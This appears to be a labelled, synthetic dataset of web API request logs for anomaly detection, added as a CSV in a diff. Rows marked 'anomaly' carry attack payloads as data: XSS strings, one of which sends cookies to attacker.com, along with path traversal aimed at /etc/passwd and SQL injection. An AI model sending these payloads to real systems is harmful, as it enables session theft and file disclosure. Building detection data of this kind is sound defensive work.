@@ -1,0 +1,1151 @@
+timestamp,endpoint,httpMethod,statusCode,responseTimeMs,label
+2023/7/19 14:01,  /sales?category=shoes&startDate=2021-01-01&endDate=2021-12-31, GET,200,560,normal
+2023/7/19 14:02,  /users, POST,200,174,normal
+2023/7/19 14:06,/beSharedItems, POST,200,465,anomaly
+2023/7/19 14:46,  /clients/ad123, DELETE,200,600,normal
+2023/7/19 13:55,  /products/review/145, POST,200,208,normal
+2023/7/19 14:19,/collections?input=<script>document.location='http://attacker.com?data='+document.cookie</script>, POST,201,760,anomaly
+2023/7/19 14:01,  /products/outdoors, GET,200,234,normal
+2023/7/19 14:28,  /shoppingCart/user123/item123, PUT,200,279,normal
+2023/7/19 14:02,  /cart/item/item1001, DELETE,302,125,normal
+2023/7/19 14:51,  /order/090, GET,200,236,normal
+2023/7/19 14:15,  /addresses, POST,200,58,normal
+2023/7/19 14:18,  /discountCodes/12345, PUT,200,308,normal
+2023/7/19 14:01,  /products/search?query=shampoo, GET,200,458,normal
+2023/7/19 14:45,  /coupon, POST,200,567,normal
+2023/7/19 13:53,  /support/request, POST,200,896,normal
+2023/7/19 13:46,/afterSaleServices/%2e%2e%2f%2e%2e%2f%2e%2e%2f/passwd, POST,200,697,anomaly
+2023/7/19 13:57,  /admin/prices, POST,201,407,normal
+2023/7/19 13:50,  /products/789, GET,200,269,normal
+2023/7/19 14:28,  /collections/item721, HEAD,404,840,normal
+2023/7/19 14:33,  /coupons/10, GET,302,151,normal
+2023/7/19 13:59,  /admin/afterSaleServices/service123, GET,200,463,normal
+2023/7/19 14:02,  /collections, POST,201,392,normal
+2023/7/19 13:51,  /product/123/comments, POST,302,260,normal
+2023/7/19 13:51,  /items/2, DELETE,200,746,normal
+2023/7/19 14:17,  /accountSummary, GET,200,350,normal
+2023/7/19 14:11,/collections, POST,200,231,anomaly
+2023/7/19 14:05,  /permissions, GET,200,361,normal
+2023/7/19 13:55,  /users/notifications, GET,200,678,normal
+2023/7/19 14:45,  /catalog/item902, GET,200,406,normal
+2023/7/19 13:51,  /stockCheck/454, GET,200,376,normal
+2023/7/19 14:01,  /reviews/333, PUT,200,210,normal
+2023/7/19 14:46,  /orders/2820, DELETE,200,435,normal
+2023/7/19 14:15,  usersprofile123, PUT,200,517,normal
+2023/7/19 14:28,  /invoices/{1200}, GET,200,380,normal
+2023/7/19 14:18,  /user/cart/789, PUT,304,982,normal
+2023/7/19 14:09,  /publishTasks/task456, GET,200,463,normal
+2023/7/19 14:02,  /user, POST,200,901,normal
+2023/7/19 14:45,  /products?page=3&limit=25, GET,200,105,normal
+2023/7/19 13:51,  /accounts/placeWithdrawalRequest/123, POST,201,437,normal
+2023/7/19 14:11,/collections, POST,302,2314,anomaly
+2023/7/19 14:30,  /inventory, GET,200,598,normal
+2023/7/19 14:09,  /afterSaleServices, POST,200,792,normal
+2023/7/19 14:25,  /customers/xyz123, GET,200,122,normal
+2023/7/19 14:51,  /user/1234, DELETE,200,400,normal
+2023/7/19 14:04,  /sendConfirmationEmail, POST,201,543,normal
+2023/7/19 14:19,"/admin/afterSaleServices/service123?query=<script>alert(""XSS"")</script>", PUT,200,984,anomaly
+2023/7/19 13:51,  /trackPackage/pack789, PUT,200,887,normal
+2023/7/19 14:02,  /products/123, DELETE,204,250,normal
+2023/7/19 14:07,  /reviews?productId=654&limit=10, GET,200,485,normal
+2023/7/19 13:55,  /customer, POST,200,172,normal
+2023/7/19 14:02,  /items/item456, DELETE,404,255,normal
+2023/7/19 13:51,  /accountSettings, GET,200,737,normal
+2023/7/19 14:02,  /products/xyz123, PUT,202,417,normal
+2023/7/19 14:04,  /order/item, PUT,200,657,normal
+2023/7/19 14:17,  /orderItems/update, PUT,200,424,normal
+2023/7/19 13:51,  /profile?userId=345, POST,202,713,normal
+2023/7/19 13:47,  /products/8761, GET,200,500,normal
+2023/7/19 13:47,  /feedback, POST,200,780,normal
+2023/7/19 14:02,  /clients/user123, PUT,200,325,normal
+2023/7/19 14:43,  /payments, POST,200,336,normal
+2023/7/19 14:48,  /order/items, PUT,200,600,normal
+2023/7/19 14:11,  /products/xyz123, PUT,200,300,normal
+2023/7/19 14:45,  /orderHistory?startDate=2021-03-05&endDate=2021-04-15, GET,200,2034,normal
+2023/7/19 13:51,  /cart/items, POST,200,902,normal
+2023/7/19 14:48,  /stats/monthlySales, GET,200,752,normal
+2023/7/19 14:02,  /members, POST,200,982,normal
+2023/7/19 14:45,  /promoteProducts, POST,201,487,normal
+2023/7/19 14:11,  /accounts/123, GET,200,950,normal
+2023/7/19 14:02,  /collections?page=5&limit=10, GET,200,24,normal
+2023/7/19 14:10,  /order/123/addComment, POST,200,322,normal
+2023/7/19 13:59,/admin/afterSaleServices?userId=456?sort_by=%3Cscript%3Ealert('XSS')%3C/script%3E, GET,200,976,anomaly
+2023/7/19 14:24,  /admin/afterSaleServices/569, GET,200,754,normal
+2023/7/19 14:36,  /shipping?postalCode=98765, GET,200,450,normal
+2023/7/19 13:51,  /receipts/456, GET,200,622,normal
+2023/7/19 13:46,  /cartItems/ABC123, DELETE,200,607,normal
+2023/7/19 14:45,  /afterSaleServices, POST,200,818,normal
+2023/7/19 13:58,  /salesReports?year=2021, GET,200,458,normal
+2023/7/19 13:46,/afterSaleServices/service789/../../../sys_log/, GET,200,821,anomaly
+2023/7/19 14:45,  /customers?page=2&limit=10, GET,499,630,normal
+2023/7/19 14:46, /checkout/order, POST,200,320,normal
+2023/7/19 14:01,  /orders/xyz234, DELETE,204,632,normal
+2023/7/19 13:57,  /categories/, POST,200,215,normal
+2023/7/19 14:49,  /orders/123, POST,204,408,normal
+2023/7/19 14:09,  /customers/{789}, GET,200,323,normal
+2023/7/19 14:02,  /categories/123/subcategories, GET,200,350,normal
+2023/7/19 14:14,/collections/234, DELETE,200,1500,anomaly
+2023/7/19 13:51,  /reviews, POST,200,827,normal
+2023/7/19 13:49,  /orders/update, PUT,302,379,normal
+2023/7/19 14:16,  /groups, PUT,200,650,normal
+2023/7/19 14:45,  /orders, POST,201,610,normal
+2023/7/19 14:24,  /products?page=3&limit=20, GET,200,750,normal
+2023/7/19 13:57,  /shipping/addresses, POST,201,1012,normal
+2023/7/19 14:25,  /products/product_456, PUT,200,513,normal
+2023/7/19 13:53,  /account/123456, PUT,200,450,normal
+2023/7/19 13:50,  /orders/abcd1234, DELETE,404,320,normal
+2023/7/19 14:02,  /products?page=2&limit=10, GET,200,211,normal
+2023/7/19 13:55,  /orders/67, PUT,200,994,normal
+2023/7/19 14:48,  /products?page=1&limit=10, GET,200,602,normal
+2023/7/19 14:31,  /product/101/description, PUT,200,782,normal
+2023/7/19 14:45,  /accounts/abc123, POST,200,578,normal
+2023/7/19 14:01,  /customer, POST,201,394,normal
+2023/7/19 13:55,/addresses?page=1&limit=10, GET,200,710,anomaly
+2023/7/19 14:02,  /cart/item123, DELETE,200,271,normal
+2023/7/19 14:45,  /products/987/comments/abc123, PUT,200,120,normal
+2023/7/19 13:51,  /inventory, GET,200,698,normal
+2023/7/19 13:46,/addresses, POST,302,405,anomaly
+2023/7/19 13:48,  /orders, POST,200,246,normal
+2023/7/19 13:56,  /shelves, POST,200,387,normal
+2023/7/19 14:45,  /customers, POST,200,551,normal
+2023/7/19 14:10,  /checkDiscount, POST,201,500,normal
+2023/7/19 13:57,  /items/item487, POST,200,453,normal
+2023/7/19 13:58,  /products/123, GET,200,982,normal
+2023/7/19 13:57,  /afterSaleServices/012, PUT,200,812,normal
+2023/7/19 14:01,  /afterSaleServices, POST,200,675,normal
+2023/7/19 14:51,  /admin/comments/qwe430, PUT,200,610,normal
+2023/7/19 14:43,  /customer/accountDetails/6459, GET,200,202,normal
+2023/7/19 13:55,  /inventory/123, POST,200,219,normal
+2023/7/19 14:25,  /accounts/xyz123, PUT,302,439,normal
+2023/7/19 14:25,  /promoCodes/876, GET,200,265,normal
+2023/7/19 14:27,  /applyCoupon, POST,200,172,normal
+2023/7/19 13:51,  /orders, POST,200,458,normal
+2023/7/19 14:46,  /promotions/promo123, GET,200,553,normal
+2023/7/19 14:31,  /update/addresses/xyz111, POST,301,570,normal
+2023/7/19 14:45,/shareRules/rule123/../../../etc/passwd, PUT,200,465,anomaly
+2023/7/19 14:33,  /customer/products/789, GET,200,1000,normal
+2023/7/19 14:48,  /cart/addProduct?userId=789&productId=101, POST,201,790,normal
+2023/7/18 13:46,  /profile, PUT,200,591,normal
+2023/7/19 13:51,  /afterSaleServices, POST,200,647,normal
+2023/7/19 13:57,/addresses?page=1&limit=10, GET,200,760,anomaly
+2023/7/19 14:29,  /orders?page=1&limit=20, GET,200,222,normal
+2023/7/18 12:03,/addresses?page=1&limit=10, GET,302,127,anomaly
+2023/7/19 13:55,  /products, POST,201,620,normal
+2023/7/19 13:51,/collections?page=3&limit=5%20OR%20'a'='a',GET,200,390,anomaly
+2023/7/19 14:19,/product/101/comments?page=3&limit=8?input=<script>document.location='http://attacker.com?data='+document.cookie</script>,GET,200,690,anomaly
+2023/7/19 14:22,  /shoppingCart/98765, POST,200,675,normal
+2023/7/19 13:51,  //items/123, POST,200,407,normal
+2023/7/19 13:55,  /comments/xyz789, POST,200,550,normal
+2023/7/19 14:02,  /products?page=1&limit=15, GET,200,590,normal
+2023/7/19 14:01,  /accounts, GET,200,346,normal
+2023/7/19 13:53,  /cart, POST,201,745,normal
+2023/7/19 14:48,  /userRegisters, POST,200,362,normal
+2023/7/19 13:53,  /admin/afterSaleServices/service159, PUT,201,712,normal
+2023/7/19 14:28,  /productReviews/456, PUT,200,797,normal
+2023/7/19 13:59,  /payment/ghi456, PUT,200,340,normal
+2023/7/19 14:45,  /user/registration, POST,200,191,normal
+2023/7/19 14:02,  /payments/order234, PUT,200,176,normal
+2023/7/19 14:37,  /orders/789, PUT,200,288,normal
+2023/7/19 13:55,  /customers/123, DELETE,200,786,normal
+2023/7/19 13:59,  /cancellations, DELETE,200,514,normal
+2023/7/19 14:51,  /customerRewards, GET,200,219,normal
+2023/7/19 14:02,  /shopping-cart, POST,200,200,normal
+2023/7/19 14:48,  /accounts, POST,201,778,normal
+2023/7/19 13:51,  /cities?page=2&limit=20, GET,302,426,normal
+2023/7/19 14:01,  /products/product321, POST,299,200,normal
+2023/7/19 14:15,  /videos, POST,201,289,normal
+2023/7/19 14:02,  /admin/orders/987, POST,200,621,normal
+2023/7/19 14:02,  /user/account/settings, PUT,200,561,normal
+2023/7/19 13:51,  /orders/item123, DELETE,200,600,normal
+2023/7/19 13:58,  /products/145, GET,200,875,normal
+2023/7/19 14:08,  /items, PUT,200,438,normal
+2023/7/19 14:22,  /user/11, PUT,200,121,normal
+2023/7/19 14:14,  /cgi-bin/getAppDis, GET,200,320,normal
+2023/7/19 13:51,  /users, POST,200,305,normal
+2023/7/19 14:13,  /product/99/comments?page=2&limit=5, GET,200,681,normal
+2023/7/19 14:15,  /item/1111/reviews, GET,200,157,normal
+2023/7/19 13:55,  /promotions/SPRING21, PUT,200,476,normal
+2023/7/19 13:59,  /planner/bookAppointment, POST,200,469,normal
+2023/7/19 14:22,  /products/productId101, DELETE,204,1576,normal
+2023/7/19 14:45,  /products?page=2&limit=6, GET,200,912,normal
+2023/7/19 14:45,  /members/update, PUT,200,210,normal
+2023/7/19 14:19,  /afterSaleServices, POST,200,342,normal
+2023/7/19 13:58,  /collections/item521, DELETE,200,310,normal
+2023/7/19 13:59,  /product/15, POST,200,299,normal
+2023/7/19 14:36,  /cart?action=add, POST,200,198,normal
+2023/7/19 13:58,  /products?page=1&limit=5, GET,200,330,normal
+2023/7/19 13:55,  /products/99, PUT,200,720,normal
+2023/7/19 14:08,  /products?page=4&limit=25, GET,200,213,normal
+2023/7/19 14:02,  /createUser, POST,201,207,normal
+2023/7/19 13:59,  /BeSharedProducts, GET,200,375,normal
+2023/7/19 13:55,  /customers, GET,200,541,normal
+2023/7/19 13:51,  /shareRules, POST,201,580,normal
+2023/7/19 14:34,  /promotions/300, PUT,200,478,normal
+2023/7/19 14:03,/shareRules/234,PUT,200,457,anomaly
+2023/7/19 14:25,  /products/book062, GET,304,365,normal
+2023/7/19 14:32,  /rebate, GET,200,231,normal
+2023/7/19 13:55,  /categories/category123, DELETE,204,109,normal
+2023/7/19 14:15,  /user/789/rewards, GET,200,929,normal
+2023/7/19 14:15,/afterSaleServices/../../root/,POST,200,691,anomaly
+2023/7/19 14:28,  /userGroups/878, PUT,404,452,normal
+2023/7/19 13:46,  /cart/items, PUT,200,401,normal
+2023/7/18 14:57,  /categories, GET,200,223,normal
+2023/7/19 14:14,  /user/order, POST,200,919,normal
+2023/7/19 13:59,  /product/614/comments?page=3&limit=10, GET,500,825,normal
+2023/7/19 13:53,  /goods/111, GET,200,399,normal
+2023/7/19 13:46,/adminInfo?page=2&limit=15,GET,200,621,anomaly
+2023/7/19 14:46,  /coupons/0675, GET,200,921,normal
+2023/7/19 14:17,  /reviews/product/987, GET,304,502,normal
+2023/7/19 14:24,  /customer/update, PUT,200,580,normal
+2023/7/19 14:51,  /customers/reviews, GET,200,750,normal
+2023/7/19 14:22,  /admin/reviews/approve, POST,200,92,normal
+2023/7/19 13:56,  /patient/prescriptions, POST,200,123,normal
+2023/7/19 14:25,  /articles/987, POST,201,652,normal
+2023/7/19 14:01,  /item/reviews, POST,302,580,normal
+2023/7/19 13:55,  /messages/xyz456, PUT,304,930,normal
+2023/7/19 13:48,  /login, POST,201,815,normal
+2023/7/19 13:48,  /user/account/123, PUT,200,683,normal
+2023/7/19 13:51,  /reviews, POST,201,170,normal
+2023/7/19 14:31,  /subscribe?email=john@example.com, POST,200,346,normal
+2023/7/19 13:55,  /products/213, PUT,200,338,normal
+2023/7/19 14:14,  /shopping/getProduct, GET,200,1201,normal
+2023/7/19 14:45,  /reviews?productId=5097&limit=3, GET,200,460,normal
+2023/7/19 14:18,/admin/afterSaleServices?userId=456&page=3&limit=20,GET,200,3255,anomaly
+2023/7/19 14:02,  /customerService/faq, GET,200,332,normal
+2023/7/19 14:08,  /payment/user234, POST,202,550,normal
+2023/7/19 13:55,  /products/12345, GET,200,274,normal
+2023/7/19 14:31,  /products/product891, PUT,200,231,normal
+2023/7/19 13:48,  /user/profile, PUT,200,737,normal
+2023/7/19 14:45,  /orders/39034, PUT,200,463,normal
+2023/7/19 13:57,  /userNotifications, POST,200,455,normal
+2023/7/19 14:28,  /account/create, POST,200,309,normal
+2023/7/19 14:25,  /customers, PUT,200,534,normal
+2023/7/19 14:11,  /carts, POST,200,839,normal
+2023/7/19 13:51,  /item/456, DELETE,200,322,normal
+2023/7/19 14:16,  /item/101/reviews, PUT,302,648,normal
+2023/7/19 14:48,  /applyCoupon, POST,200,430,normal
+2023/7/19 14:19,  /users, POST,201,887,normal
+2023/7/19 14:15,  /payments, POST,200,724,normal
+2023/7/19 13:59,  /products/tsh789, PUT,302,500,normal
+2023/7/19 14:25,  /weather, GET,200,566,normal
+2023/7/19 14:14,  /notifications?userId=234, DELETE,403,193,normal
+2023/7/19 13:58,  /cart, POST,200,444,normal
+2023/7/19 14:01,  /collections/update-products, PUT,302,769,normal
+2023/7/19 14:49,  /addSubscriber, POST,200,641,normal
+2023/7/19 13:54,  /updateUser, POST,202,500,normal
+2023/7/19 14:31,  /admin/bills?year=2022, GET,200,692,normal
+2023/7/19 14:13,  /orders/track?number=qwe123, POST,200,479,normal
+2023/7/19 14:02,  /cart, POST,200,400,normal
+2023/7/19 13:57,  /payments, POST,200,681,normal
+2023/7/19 14:25,  /inventory/item101, GET,200,270,normal
+2023/7/19 14:11,  /vehicles, POST,200,100,normal
+2023/7/19 14:45,/addresses,POST,200,340,anomaly
+2023/7/19 13:51,/collections?page=2&limit=15?title=<script>evilFunction()</script>,GET,404,450,anomaly
+2023/7/19 14:19,  /users/123, DELETE,205,362,normal
+2023/7/19 13:51,  /login, GET,200,524,normal
+2023/7/19 14:01,  /locations/country/us/region/mn, GET,200,923,normal
+2023/7/19 14:15,  /users/profile?userId=123, GET,200,385,normal
+2023/7/19 14:46,  /shippingAdresses/xyz456, DELETE,302,782,normal
+2023/7/19 14:28,  /payment/payment987, DELETE,200,444,normal
+2023/7/19 13:51,  /cart/5555, PUT,201,494,normal
+2023/7/19 14:48,  /products, POST,201,291,normal
+2023/7/19 14:23,  /products/car-parts, GET,200,290,normal
+2023/7/19 14:25,  /orders/order1456, PUT,200,484,normal
+2023/7/19 13:54,  /accountInfo, PUT,200,340,normal
+2023/7/19 13:47,  //admin/afterSaleServices?userId=422, GET,200,674,normal
+2023/7/19 13:46,/adminInfo?page=3&limit=5,GET,200,752,anomaly
+2023/7/19 13:46,/sysManager/shareRules,POST,200,500,anomaly
+2023/7/19 13:55,  /product/777/comments, POST,200,290,normal
+2023/7/19 13:51,  /rebate, GET,200,688,normal
+2023/7/19 14:17,  /reviews/222, GET,200,798,normal
+2023/7/19 13:57,  /creditCards/22, DELETE,200,524,normal
+2023/7/19 13:54,  /signup, POST,200,425,normal
+2023/7/19 13:51,/collections?page=3&limit=5?title=<script>evilFunction()</script>,GET,404,390,anomaly
+2023/7/19 13:58,  /shareRules/rule236, DELETE,200,457,normal
+2023/7/19 14:01,  /products/add, POST,200,355,normal
+2023/7/19 14:31,/products/3321,GET,200,710,anomaly
+2023/7/19 14:15,  /addresses, POST,201,765,normal
+2023/7/19 14:23,  /collections, POST,201,1289,normal
+2023/7/19 13:59,  /cart/items, POST,200,903,normal
+2023/7/19 14:03,  /register, POST,201,420,normal
+2023/7/19 14:04,  /orders/order101, GET,200,294,normal
+2023/7/19 14:45,  /orders/123, DELETE,200,890,normal
+2023/7/19 13:51,  /products?page=2&limit=10, GET,200,715,normal
+2023/7/19 14:28,  /categories/cat45, POST,200,220,normal
+2023/7/19 13:51,/collections?page=2%20OR%20'a'='a'&limit=15,GET,200,450,anomaly
+2023/7/19 14:01,  /help/articles?page=2&limit=10, GET,200,942,normal
+2023/7/19 13:53,  /orders?page=3&limit=20, GET,200,506,normal
+2023/7/19 13:59,  /payments, POST,201,655,normal
+2023/7/19 13:51,  /products/99, PUT,200,285,normal
+2023/7/19 14:02,  /users, POST,200,307,normal
+2023/7/19 13:58,  /cart, PUT,200,541,normal
+2023/7/19 14:07,  /billing/purchase/, POST,302,500,normal
+2023/7/19 14:48,  /product/190/specification?productId=190, GET,200,645,normal
+2023/7/19 14:35,/afterSaleServices/123,PUT,200,3490,anomaly
+2023/7/19 14:13,  /products/123, GET,200,300,normal
+2023/7/19 14:03,  /restaurants/xyz123, PUT,200,400,normal
+2023/7/19 14:00,  /admin/afterSaleServices?userId=123, GET,200,824,normal
+2023/7/19 13:55,  /inventory, POST,201,618,normal
+2023/7/19 14:31,  /subscriptions/567, PUT,200,602,normal
+2023/7/19 14:17,  /admin/users/345, PUT,200,755,normal
+2023/7/19 13:48,  /admin/trackOrder/456, GET,200,397,normal
+2023/7/19 14:15,  /items/abc123, PUT,200,871,normal
+2023/7/19 14:51,/beSharedItems?q=<script>maliciousFunction()</script>,POST,201,560,anomaly
+2023/7/19 14:15,  /products?categoryId=567, GET,200,929,normal
+2023/7/19 14:01,/comments/abc123/../../../sys_log,DELETE,200,490,anomaly
+2023/7/19 14:05,  /orders/order123, PUT,200,609,normal
+2023/7/19 14:27,  /admin/inventory/item123, PUT,200,357,normal
+2023/7/19 14:10,/collections?page=2&limit=15,GET,200,472,anomaly
+2023/7/19 13:55,/addresses?page=1&limit=10,GET,200,293,anomaly
+2023/7/19 14:18,  /bundles?page=2&limit=8, GET,200,830,normal
+2023/7/19 14:45,  /shoppingCart/item101, POST,201,290,normal
+2023/7/19 14:47,  /orders, POST,200,666,normal
+2023/7/19 14:01,  /afterSaleServices/234, PUT,200,411,normal
+2023/7/19 13:55,  /customer/reviews/review123, DELETE,204,989,normal
+2023/7/19 13:46,  /products/2212, DELETE,200,680,normal
+2023/7/19 14:28,  /inventory/items/item0321, GET,200,675,normal
+2023/7/19 13:57,/shareRules/rule456/../../../etc/passwd,DELETE,204,500,anomaly
+2023/7/19 14:22,  /products/789, POST,201,648,normal
+2023/7/19 14:31,  /afterSaleServices/service404, PUT,200,467,normal
+2023/7/19 13:51,/comments/xyz789/../../../sys_log,DELETE,200,500,anomaly
+2023/7/19 14:14,  /paymentMethods?pageNumber=3, GET,200,316,normal
+2023/7/19 13:58,  /reviews/abc456, DELETE,200,610,normal
+2023/7/19 14:35,  /cartItems/1234, PUT,200,690,normal
+2023/7/19 14:31,  /paymentMethods, POST,302,901,normal
+2023/7/19 14:44,  /orders/order123, GET,200,624,normal
+2023/7/19 14:52,  /account/update, PUT,200,245,normal
+2023/7/19 14:11,  /catalog/111, GET,200,482,normal
+2023/7/19 13:53,  /admin/coupons, POST,200,607,normal
+2023/7/19 13:49,  /adjustRebate, PUT,202,456,normal
+2023/7/19 14:15,  /reviews, POST,200,947,normal
+2023/7/19 14:46,  /customers/abc123, PUT,200,636,normal
+2023/7/19 13:59,  /inventory/item789, POST,200,461,normal
+2023/7/19 13:47,  /users/user567, POST,200,200,normal
+2023/7/19 14:37,  /updateCart, PUT,200,798,normal
+2023/7/19 14:19,/collections?input=<script>document.location='http://attacker.com?data='+document.cookie</script>,POST,201,865,anomaly
+2023/7/19 13:46,  /checkout, POST,200,352,normal
+2023/7/19 14:25,  /products/123/comments, POST,200,441,normal
+2023/7/19 14:02,  /users/123, PUT,200,745,normal
+2023/7/19 13:53,  /cart?page=4&limit=25, GET,200,699,normal
+2023/7/19 14:13,  /products?search=shoe, GET,200,760,normal
+2023/7/18 14:57,  /admin/afterSaleServices/service716, GET,200,962,normal
+2023/7/19 14:45,  /products?page=2&limit=20, GET,200,420,normal
+2023/7/19 14:32,  /search?keyword=tv, GET,200,592,normal
+2023/7/19 14:01,  /inventories/item123, GET,200,393,normal
+2023/7/19 14:31,  /statistics, GET,200,991,normal
+2023/7/19 13:46,/afterSaleServices/service789/../../etc/hosts,GET,200,821,anomaly
+2023/7/19 13:46,/afterSaleServices/service101/../../../sys_log/,GET,200,547,anomaly
+2023/7/19 14:42,  /users, POST,200,999,normal
+2023/7/19 13:51,  /userProfiles, DELETE,200,125,normal
+2023/7/19 13:55,  /transactions/456, GET,200,580,normal
+2023/7/19 14:45,  /admin/afterSaleServices, POST,200,374,normal
+2023/7/19 14:17,  /orders/order123/items/item1, POST,201,745,normal
+2023/7/19 14:32,  /checkout/xyz123, PUT,401,923,normal
+2023/7/19 14:49,  /makePayment, POST,200,569,normal
+2023/7/19 14:35,  /paymentstatus?date=11-17-2021, GET,200,500,normal
+2023/7/19 13:53,  /cart/items/item123, DELETE,200,828,normal
+2023/7/19 13:58,  /product/399/discount?code=XXL, GET,200,543,normal
+2023/7/19 14:45,  /inventory, GET,200,150,normal
+2023/7/19 13:55,  /orders/order567, POST,201,608,normal
+2023/7/19 14:14,  /shareRules, POST,200,471,normal
+2023/7/19 14:40,  /carts, POST,200,541,normal
+2023/7/19 14:17,  /products/category/electronics, GET,200,602,normal
+2023/7/19 14:34,/afterSaleServices/123,PUT,200,4500,anomaly
+2023/7/19 13:51,  /user, POST,200,776,normal
+2023/7/19 14:02,  /coupons?userId=999&page=2&limit=4, GET,200,743,normal
+2023/7/19 14:25,  /user/login, POST,201,560,normal
+2023/7/19 14:16,  /product/102, POST,200,707,normal
+2023/7/19 14:11,  /products/101/prices, GET,200,693,normal
+2023/7/19 13:55,  /payment?orderId=1234, POST,200,859,normal
+2023/7/19 13:59,  /addProducts, POST,201,245,normal
+2023/7/19 14:45,  /cart/234, PUT,200,566,normal
+2023/7/19 14:02,  /previousOrders, GET,200,900,normal
+2023/7/19 14:31,  /store, POST,201,705,normal
+2023/7/19 14:17,  /users/89/orders, GET,200,224,normal
+2023/7/19 14:31,  /users/register, POST,200,420,normal
+2023/7/19 14:23,  /goods/445, PUT,200,926,normal
+2023/7/19 13:55,  /orders/987, DELETE,200,120,normal
+2023/7/19 13:58,  /cart/224, DELETE,200,595,normal
+2023/7/19 13:59,  /afterSaleServices, POST,200,901,normal
+2023/7/19 14:11,  /inventory, GET,200,300,normal
+2023/7/19 13:55,/addresses,POST,200,340,anomaly
+2023/7/19 13:46,  /orders?userId=123&limit=5&page=1, GET,200,816,normal
+2023/7/19 13:46,  /addresses?userId=098, GET,200,354,normal
+2023/7/19 14:22,  /accounts/user123, POST,200,328,normal
+2023/7/19 13:48,  /reviews/123, GET,302,223,normal
+2023/7/19 13:51,/shareRules/rule789/../../../etc/hosts,PUT,200,400,anomaly
+2023/7/19 13:59,//admin/afterSaleServices?userId=789?sort_by=%3Cscript%3Ealert('XSS')%3C/script%3E,GET,200,763,anomaly
+2023/7/19 13:57,  /products/456, GET,200,588,normal
+2023/7/19 13:55,  /orderHistory?userId=456&productId=321, POST,200,851,normal
+2023/7/19 14:11,  /wishlist, POST,201,462,normal
+2023/7/19 13:51,  /admins/admin123, GET,200,769,normal
+2023/7/19 14:27,  /wishlist?itemId=123, DELETE,200,690,normal
+2023/7/19 13:54,  /support, POST,201,500,normal
+2023/7/19 14:45,  /products/104, GET,200,520,normal
+2023/7/19 14:02,  /orderItems, POST,201,622,normal
+2023/7/19 14:45,  /admin/billing/payment678, POST,200,753,normal
+2023/7/19 13:59,  /orders, POST,200,500,normal
+2023/7/19 14:51,  /product/images, GET,200,500,normal
+2023/7/18 12:03,  /beSharedItems, POST,201,941,normal
+2023/7/19 13:55,  /products, POST,201,234,normal
+2023/7/19 14:46,  /folders/, POST,200,416,normal
+2023/7/19 13:55,  /product/456, PUT,200,521,normal
+2023/7/19 14:03,  /groups, POST,200,313,normal
+2023/7/19 14:33,  /users/account456, DELETE,204,586,normal
+2023/7/19 14:02,  /categories/ghi789, GET,200,609,normal
+2023/7/19 13:55,  /products/update, PUT,200,561,normal
+2023/7/19 13:55,  /carts/23, GET,200,382,normal
+2023/7/19 14:05,/afterSaleServices?page=2&limit=15,GET,200,962,anomaly
+2023/7/19 14:45,  /afterSaleServices, POST,200,401,normal
+2023/7/19 14:19,  /admin/customer/451, GET,200,350,normal
+2023/7/19 14:31,/addresses,POST,200,300,anomaly
+2023/7/19 14:48,  /orders/shipping/123, GET,200,482,normal
+2023/7/19 14:02,  /checkout, POST,200,423,normal
+2023/7/19 14:18,  /subscribe/page1, GET,201,500,normal
+2023/7/19 13:51, /collections?page=3&limit=5?title=<script>evilFunction()</script>,GET,200,560,anomaly
+2023/7/19 13:59,  /users/1111, PUT,200,407,normal
+2023/7/19 13:53,  /admin/orders/xyz123, PUT,200,531,normal
+2023/7/19 14:11,  /reviews/product123, POST,200,242,normal
+2023/7/19 14:11,/collections?page=1&limit=12,GET,200,313,anomaly
+2023/7/19 13:50,  /categories/321, PUT,200,539,normal
+2023/7/19 14:51,  /orderStatus/status101, PUT,200,513,normal
+2023/7/19 14:45,  /customers/3456, GET,200,193,normal
+2023/7/19 14:25,  /products/reviews/123abc, POST,200,890,normal
+2023/7/19 13:46,/addresses?page=1&limit=10,GET,302,333,anomaly
+2023/7/19 14:32,  /paymentProcess, POST,201,785,normal
+2023/7/19 13:59,  /products/456, POST,200,383,normal
+2023/7/19 13:49,  /carts/cart321, DELETE,200,397,normal
+2023/7/19 14:20,/admin/afterSaleServices/123,GET,200,6500,anomaly
+2023/7/19 14:16,  /orders/order001, PUT,200,854,normal
+2023/7/19 13:46,/afterSaleServices/%2e%2e%2f%2e%2e%2f%2e%2e%2f/passwd,POST,200,697,anomaly
+2023/7/19 14:11,  /feedback/order101, POST,201,811,normal
+2023/7/19 14:00,  /admin/analytics/userData, GET,200,385,normal
+2023/7/19 14:46,  /containers/45, PUT,200,240,normal
+2023/7/19 14:19,  /products/123, GET,200,650,normal
+2023/7/19 14:52,  /savedItems?uid=user456, GET,200,41,normal
+2023/7/19 14:47,  /subscriptions?userId=234, GET,200,678,normal
+2023/7/19 13:51,  /cart/xyz789, POST,200,330,normal
+2023/7/19 14:45,  /collections/users?userId=345&start=2019-08&end=2020-01, GET,200,203,normal
+2023/7/19 13:58,  /sharedCollections, POST,201,821,normal
+2023/7/19 14:20,  /issues/issue123, PUT,200,278,normal
+2023/7/19 13:46,  /shareRules, POST,200,458,normal
+2023/7/19 14:45,  /users?page=3&limit=20, GET,200,157,normal
+2023/7/19 14:36,  /cart/ghi789, PUT,301,500,normal
+2023/7/19 14:49,/orders/123/../../../passwd/,GET,302,843,anomaly
+2023/7/19 14:04,  /inventory, GET,200,478,normal
+2023/7/19 13:59,  /categories/cat789, PUT,200,734,normal
+2023/7/19 14:08,  //admin/users?adminId=777, GET,200,611,normal
+2023/7/19 14:46,  /reviews/rv321, GET,302,425,normal
+2023/7/19 14:52,/addresses/pqr456/../../../passwd,DELETE,302,309,anomaly
+2023/7/19 14:02,  /orderDetails/abc123, GET,200,470,normal
+2023/7/19 14:25,  /sharesRules/rule123, PUT,201,410,normal
+2023/7/19 13:53,  /users/789, PUT,200,422,normal
+2023/7/19 13:55,  /rewards, POST,201,535,normal
+2023/7/19 14:02,  /orders/order321, PUT,200,365,normal
+2023/7/19 13:55,  /paymentRates, GET,200,650,normal
+2023/7/19 14:02,  /shareComments, POST,201,675,normal
+2023/7/19 14:27,  /orders/abc123, PUT,200,420,normal
+2023/7/19 14:04,  /orders/abc456, DELETE,200,590,normal
+2023/7/19 14:22,  /shop/promocodes, GET,200,175,normal
+2023/7/19 14:31,  /transactions/yz123, POST,201,620,normal
+2023/7/19 13:57,  /cart/567, PUT,200,337,normal
+2023/7/19 13:49,  /events, POST,200,345,normal
+2023/7/19 14:31,  /cart/user123, GET,200,434,normal
+2023/7/19 13:55,  /users/7, PUT,200,633,normal
+2023/7/19 14:17,  /orders?page=2&limit=10, GET,200,157,normal
+2023/7/19 14:29,  /products/prod123, GET,200,401,normal
+2023/7/19 14:02,  /payment/success, POST,200,180,normal
